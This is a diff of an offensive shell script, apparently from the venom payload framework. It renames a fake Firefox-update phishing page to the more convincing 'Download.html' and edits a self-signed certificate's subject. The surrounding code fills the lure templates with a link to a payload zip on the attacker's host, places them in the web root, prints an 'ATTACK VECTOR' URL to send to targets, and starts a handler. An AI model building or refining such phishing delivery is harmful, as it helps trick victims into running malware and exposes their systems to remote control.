@@ -12077,8 +12077,8 @@ if [ "$phish" = "Mega-Upload (default)" ]; then
    mv MegaUpload.html $ApAcHe/MegaUpload.html > /dev/nul 2>&1
 else
    cd $IPATH/templates/phishing/firefox
-   sed "s|NaM3|http://$lhost/$Drop.zip|g" FakeUpdate.html > ID00788.html
-   mv ID00788.html $ApAcHe/ID00788.html > /dev/nul 2>&1
+   sed "s|NaM3|http://$lhost/$Drop.zip|g" FakeUpdate.html > Download.html
+   mv Download.html $ApAcHe/Download.html > /dev/nul 2>&1
    cp -r FakeUpdate_files $ApAcHe/FakeUpdate_files > /dev/nul 2>&1
 fi
 cd $IPATH
@@ -12101,7 +12101,7 @@ echo "- ${YellowF}SEND THE URL GENERATED TO TARGET HOST${white}"
 if [ "$phish" = "Mega-Upload (default)" ]; then
    echo "${BlueF}- ATTACK VECTOR: http://$lhost/MegaUpload.html"
 else
-   echo "${BlueF}- ATTACK VECTOR: http://$lhost/ID00788.html"
+   echo "${BlueF}- ATTACK VECTOR: http://$lhost/Download.html"
 fi
 echo "${BlueF}---"${Reset};
 echo -n "${BlueF}[☠]${white} Press any key to start a handler .."
@@ -12120,7 +12120,7 @@ rm $ApAcHe/MegaUpload.html > /dev/nul 2>&1
 rm $IPATH/output/$NaM.ps1 > /dev/nul 2>&1
 rm $IPATH/output/$Drop.zip > /dev/nul 2>&1
 rm -r $ApAcHe/FakeUpdate_files > /dev/nul 2>&1
-rm $ApAcHe/ID00788.html > /dev/nul 2>&1
+rm $ApAcHe/Download.html > /dev/nul 2>&1
 sh_menu
 }
 
@@ -12229,7 +12229,7 @@ echo "}" >> $IPATH/output/$NaM.ps1
 ## Generate SSL certificate openssl
 cd $IPATH/output
 echo "${BlueF}[☠]${white} Building SSL certificate (openssl) .."${Reset};sleep 2
-xterm -T " Building SSL certificate " -geometry 110x23 -e "openssl req -x509 -newkey rsa:4096 -keyout key.pem -out cert.pem -days 365 -nodes -subj \"/C=US/ST=Texas/L=Albany/O=Global Security/OU=IT Department/CN=$CN\""
+xterm -T " Building SSL certificate " -geometry 110x23 -e "openssl req -x509 -newkey rsa:4096 -keyout key.pem -out cert.pem -days 365 -nodes -subj \"/C=PT/ST=Estremadura/L=Lisbon/O=Global Security/OU=IT Department/CN=$CN\""
 echo "${BlueF}[☠]${white} venom-main/output/key.pem + cert.pem ([${GreenF}OK${white}])${white} ..";sleep 2
 cd $IPATH
 
@@ -12243,8 +12243,8 @@ if [ "$phish" = "Mega-Upload (default)" ]; then
    mv MegaUpload.html $ApAcHe/MegaUpload.html > /dev/nul 2>&1
 else
    cd $IPATH/templates/phishing/firefox
-   sed "s|NaM3|http://$lhost/$Drop.zip|g" FakeUpdate.html > ID00788.html
-   mv ID00788.html $ApAcHe/ID00788.html > /dev/nul 2>&1
+   sed "s|NaM3|http://$lhost/$Drop.zip|g" FakeUpdate.html > Download.html
+   mv Download.html $ApAcHe/Download.html > /dev/nul 2>&1
    cp -r FakeUpdate_files $ApAcHe/FakeUpdate_files > /dev/nul 2>&1
 fi
 cd $IPATH
@@ -12267,7 +12267,7 @@ echo "- ${YellowF}SEND THE URL GENERATED TO TARGET HOST${white}"
 if [ "$phish" = "Mega-Upload (default)" ]; then
    echo "${BlueF}- ATTACK VECTOR: http://$lhost/MegaUpload.html"
 else
-   echo "${BlueF}- ATTACK VECTOR: http://$lhost/ID00788.html"
+   echo "${BlueF}- ATTACK VECTOR: http://$lhost/Download.html"
 fi
 echo "${BlueF}---"${Reset};
 echo -n "${BlueF}[☠]${white} Press any key to start a handler .."
@@ -12290,7 +12290,7 @@ rm $IPATH/output/cert.pem > /dev/nul 2>&1
 rm $IPATH/output/key.pem > /dev/nul 2>&1
 rm $IPATH/output/$Drop.zip > /dev/nul 2>&1
 rm -r $ApAcHe/FakeUpdate_files > /dev/nul 2>&1
-rm $ApAcHe/ID00788.html > /dev/nul 2>&1
+rm $ApAcHe/Download.html > /dev/nul 2>&1
 sh_menu
 }
 
@@ -12393,8 +12393,8 @@ if [ "$phish" = "Mega-Upload (default)" ]; then
    mv MegaUpload.html $ApAcHe/MegaUpload.html > /dev/nul 2>&1
 else
    cd $IPATH/templates/phishing/firefox
-   sed "s|NaM3|http://$lhost/$Drop.zip|g" FakeUpdate.html > ID00788.html
-   mv ID00788.html $ApAcHe/ID00788.html > /dev/nul 2>&1
+   sed "s|NaM3|http://$lhost/$Drop.zip|g" FakeUpdate.html > Download.html
+   mv Download.html $ApAcHe/Download.html > /dev/nul 2>&1
    cp -r FakeUpdate_files $ApAcHe/FakeUpdate_files > /dev/nul 2>&1
 fi
 cd $IPATH
@@ -12417,7 +12417,7 @@ echo "- ${YellowF}SEND THE URL GENERATED TO TARGET HOST${white}"
 if [ "$phish" = "Mega-Upload (default)" ]; then
    echo "${BlueF}- ATTACK VECTOR: http://$lhost/MegaUpload.html"
 else
-   echo "${BlueF}- ATTACK VECTOR: http://$lhost/ID00788.html"
+   echo "${BlueF}- ATTACK VECTOR: http://$lhost/Download.html"
 fi
 echo "${BlueF}---"${Reset};
 echo -n "${BlueF}[☠]${white} Press any key to start a handler .."
@@ -12437,7 +12437,7 @@ rm $ApAcHe/MegaUpload.html > /dev/nul 2>&1
 rm $IPATH/output/$NaM.ps1 > /dev/nul 2>&1
 rm $IPATH/output/$Drop.zip > /dev/nul 2>&1
 rm -r $ApAcHe/FakeUpdate_files > /dev/nul 2>&1
-rm $ApAcHe/ID00788.html > /dev/nul 2>&1
+rm $ApAcHe/Download.html > /dev/nul 2>&1
 sh_menu
 }
 
